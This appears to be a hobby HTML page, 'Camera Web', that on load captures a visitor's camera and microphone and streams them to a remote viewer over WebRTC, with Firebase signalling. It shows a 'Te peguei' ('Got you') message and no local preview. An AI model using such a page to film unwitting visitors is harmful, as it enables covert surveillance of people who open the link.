<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Camera Web</title>
</head>

<body>

    <h1>Camera Web</h1>

    <p style="font-size: 32px">Te peguei</p>

    <video id="camera" autoplay playsinline></video>

    <script type="module">

        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-app.js";

        import {
            getDatabase,
            ref,
            set,
            push,
            onValue,
            onChildAdded
        }
        from "https://www.gstatic.com/firebasejs/12.18.0/firebase-database.js";


        const firebaseConfig = {
            apiKey: "AIzaSyDOxjJ26Epq0FNkFjzwHtmDXxlPHX96A34",
            authDomain: "camera-web-cea80.firebaseapp.com",
            databaseURL: "https://camera-web-cea80-default-rtdb.firebaseio.com",
            projectId: "camera-web-cea80",
            storageBucket: "camera-web-cea80.firebasestorage.app",
            messagingSenderId: "300751079533",
            appId: "1:300751079533:web:db8421292d4bb9b8691764"
        };


        const app = initializeApp(firebaseConfig);

        const database = getDatabase(app);

        console.log("Firebase inicializado com sucesso!");


        const configuracaoWebRTC = {

            iceServers: [
                {
                    urls: "stun:stun.l.google.com:19302"
                }
            ]

        };


        const conexao =
            new window.RTCPeerConnection(configuracaoWebRTC);

        console.log("Conexão WebRTC criada com sucesso!");


        async function iniciarCamera() {

            try {

                const stream =
                    await navigator.mediaDevices.getUserMedia({

                        video: {
        width: {
            ideal: 1280,
            max: 1280
        },
        height: {
            ideal: 720,
            max: 720
        },
        frameRate: {
            ideal: 30,
            max: 30
        }
    },
                        audio: true

                    });


                const video =
                    document.getElementById("camera");


                stream.getTracks().forEach(track =>

                    conexao.addTrack(track, stream)

                );


                console.log(
                    "Fluxo de mídia adicionado à conexão WebRTC com sucesso!"
                );


                const oferta =
                    await conexao.createOffer();


                await conexao.setLocalDescription(oferta);


                await set(

                    ref(database, "sala/oferta"),

                    {
                        sdp: oferta.sdp,
                        type: oferta.type
                    }

                );


                console.log(
                    "Oferta enviada para o Firebase com sucesso!"
                );


            }

            catch (erro) {

                console.error(
                    "Erro ao acessar a câmera:",
                    erro
                );

            }

        }


        // Receber resposta do visualizador

        onValue(

            ref(database, "sala/resposta"),

            async (snapshot) => {

                const resposta = snapshot.val();


                if (!resposta) {

                    console.log(
                        "Aguardando a resposta..."
                    );

                    return;

                }


                console.log(
                    "Resposta recebida!"
                );


                await conexao.setRemoteDescription(

                    new RTCSessionDescription(resposta)

                );


                console.log(
                    "Conexão WebRTC estabelecida com sucesso!"
                );

            }

        );


        // Enviar candidatos ICE da câmera

        conexao.onicecandidate = function(evento) {

            if (evento.candidate) {

                console.log(
                    "Candidato ICE encontrado!"
                );


                push(

                    ref(database, "sala/cameraCandidates"),

                    evento.candidate.toJSON()

                );


                console.log(
                    "Candidato ICE enviado para o Firebase com sucesso!"
                );

            }

        };


        // Receber candidatos ICE do visualizador

        onChildAdded(

            ref(database, "sala/viewerCandidates"),

            async (snapshot) => {

                const candidato = snapshot.val();


                if (!candidato) {

                    console.log(
                        "Aguardando candidatos ICE..."
                    );

                    return;

                }


                console.log(
                    "Candidato ICE recebido!"
                );


                try {

                    await conexao.addIceCandidate(

                        new RTCIceCandidate(candidato)

                    );


                    console.log(
                        "Candidato ICE adicionado à conexão WebRTC com sucesso!"
                    );

                }

                catch (erro) {

                    console.error(
                        "Erro ao adicionar candidato ICE:",
                        erro
                    );

                }

            }

        );


        // Iniciar câmera

        iniciarCamera();


    </script>

</body>

</html>
